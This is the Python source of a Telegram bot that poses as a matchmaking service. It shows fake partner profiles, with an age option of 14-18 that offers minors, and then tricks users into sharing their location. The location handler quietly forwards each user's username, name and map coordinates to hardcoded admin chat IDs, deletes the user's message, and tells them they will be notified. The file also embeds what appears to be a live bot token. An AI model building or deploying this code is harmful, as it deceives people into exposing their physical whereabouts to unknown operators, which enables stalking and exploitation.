import telebot
from telebot import types
import random
import time
import logging

# Replace with your bot token and admin chat IDs
BOT_TOKEN = '7482737914:AAE5yiXJSVq3Y0E4B0MpWqgloWW2u1dIjEY'
ADMIN_CHAT_IDS = ['2104592399', '6631360869']

bot = telebot.TeleBot(BOT_TOKEN)

# Adjust logging level to suppress info messages
logging.basicConfig(level=logging.WARNING)

# Extended list of names
MALE_NAMES = [
    "Ravi", "Arjun", "Vikram", "Suresh", "Rajesh", "Anil", "Amit", "Manoj", "Kumar", "Sanjay",
    "Sunil", "Ravi Kumar", "Siddharth", "Nitin", "Ashok", "Ramesh", "Deepak", "Praveen", "Pankaj",
    "Akhil", "Harsh", "Rohan", "Vikas", "Ajay", "Rakesh", "Rajat", "Karan", "Naveen", "Jitendra",
    "Ravi Shankar", "Vivek", "Mahesh", "Nikhil"
]

FEMALE_NAMES = [
    "Aarti", "Priya", "Sita", "Laxmi", "Pooja", "Sneha", "Kavita", "Neha", "Geeta", "Rita",
    "Rekha", "Anjali", "Nisha", "Shilpa", "Sunita", "Sangeeta", "Poonam", "Meena", "Madhuri", "Komal",
    "Sonali", "Kiran", "Divya", "Isha", "Jaya", "Shweta", "Simran", "Rupal", "Namrata", "Kajal",
    "Suman", "Rashmi", "Priti", "Sonia"
]

# Categorized lists of surnames
SURNAMES_BY_CASTE = {
    "General": ["Sharma", "Gupta", "Shukla", "Saxena", "Bansal", "Agarwal", "Chopra"],
    "SC/ST": ["Raj", "Rao", "Chauhan", "Khatik", "Mishra", "Dewangan", "Kumawat"],
    "OBC": ["Yadav", "Jatav", "Chaudhary", "Kushwaha", "Nayak", "Saini"],
    "Muslim": ["Khan", "Ali", "Shaikh", "Siddiqui", "Jamal", "Ansari"],
    "Christian": ["Fernandes", "Pinto", "D'Souza", "Lobo", "Rebelo", "Silva"],
    "Sikh": ["Singh", "Kaur", "Sandhu", "Brar", "Gill", "Bajwa"],
}

# Extended list of Indian cities
INDIAN_CITIES = [
    "Mumbai", "Delhi", "Bangalore", "Hyderabad", "Ahmedabad", "Chennai", "Kolkata", "Surat", "Pune",
    "Jaipur", "Lucknow", "Kanpur", "Nagpur", "Indore", "Bhopal", "Vadodara", "Coimbatore", "Patna",
    "Agra", "Meerut", "Vijayawada", "Nashik", "Thane", "Rajkot", "Faridabad", "Mangalore", "Guwahati",
    "Bhubaneswar", "Ranchi", "Dehradun", "Chandigarh", "Shimla", "Haridwar", "Udaipur", "Jodhpur",
    "Jabalpur", "Bilaspur", "Raipur", "Aurangabad", "Amritsar", "Jalandhar", "Ludhiana", "Kota", "Rourkela",
    "Siliguri", "Durgapur"
]

# Store user data globally for later use
user_data = {}

def get_random_age_from_range(age_range):
    start_age, end_age = map(int, age_range.split('-'))
    return random.randint(start_age, end_age)

def get_random_surname(caste_or_religion):
    surnames = SURNAMES_BY_CASTE.get(caste_or_religion, [])
    return random.choice(surnames) if surnames else "Unknown"

def generate_random_number():
    number = f"{random.randint(700000000, 999999999)}"
    hidden_number = number[:6] + "XXXX"
    return f"+91 {hidden_number}"

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    
    loading_msg = bot.send_message(chat_id, "Loading.....")
    time.sleep(1)  # Simulate loading time
    bot.delete_message(chat_id, loading_msg.message_id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Female", callback_data="gender_female"))
    markup.add(types.InlineKeyboardButton("Male", callback_data="gender_male"))
    bot.send_message(chat_id, "Please choose the partner you want to make", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gender_'))
def handle_gender_choice(call):
    chat_id = call.message.chat.id
    gender = call.data.split('_')[1]
    user_data[chat_id] = {'gender': gender}
    
    loading_msg = bot.send_message(chat_id, "Loading.....")
    time.sleep(1)  # Simulate loading time
    bot.delete_message(chat_id, loading_msg.message_id)
    
    markup = types.InlineKeyboardMarkup()
    age_ranges = ["14-18", "19-22", "23-25", "26-29"]
    for age_range in age_ranges:
        markup.add(types.InlineKeyboardButton(age_range, callback_data=f"age_{age_range}_{gender}"))
    bot.send_message(chat_id, "Please choose the age range of the partner you want to make", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('age_'))
def handle_age_choice(call):
    chat_id = call.message.chat.id
    parts = call.data.split('_')
    age_range = parts[1]
    gender = parts[2]
    
    user_data[chat_id].update({'age_range': age_range})
    
    loading_msg = bot.send_message(chat_id, "Loading.....")
    time.sleep(1)  # Simulate loading time
    bot.delete_message(chat_id, loading_msg.message_id)
    
    age = get_random_age_from_range(age_range)
    name = random.choice(FEMALE_NAMES) if gender == "female" else random.choice(MALE_NAMES)
    surname = get_random_surname("General")
    number = generate_random_number()
    city = random.choice(INDIAN_CITIES)
    
    user_data[chat_id].update({
        'name': name,
        'surname': surname,
        'number': number,
        'city': city,
        'age': age
    })
    
    details_msg = f"""
    Here are the details of your partner:
    
Name: {name} {surname}
Age: {age}
City: {city}
Number: {number}
    """
    bot.send_message(chat_id, details_msg)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("choose", callback_data="find_location"))
    bot.send_message(chat_id, "Here is the final step: please choose the city or state", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'find_location')
def handle_find_location(call):
    chat_id = call.message.chat.id
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("Find out", request_location=True))
    bot.send_message(chat_id, "Find partner for your nearby location.", reply_markup=markup)

@bot.message_handler(content_types=['location'])
def handle_location(message):
    chat_id = message.chat.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name or ""
    location = message.location
    location_url = f"https://www.google.com/maps?q={location.latitude},{location.longitude}"
    
    location_info = f"""
    User location detected.
    
Username:- @{username}
Name:- {first_name} {last_name}
Google Map:- {location_url}
    """
    
    for admin_id in ADMIN_CHAT_IDS:
        try:
            bot.send_message(admin_id, location_info)
        except Exception as e:
            logging.error(f"Failed to send message to {admin_id}: {e}")
    
    bot.delete_message(chat_id, message.message_id)
    
    loading_msg = bot.send_message(chat_id, "Loading.....")
    time.sleep(1)
    bot.delete_message(chat_id, loading_msg.message_id)
    
    bot.send_message(chat_id, "Thanks for joining us. We will notify you soon.")

bot.infinity_polling()
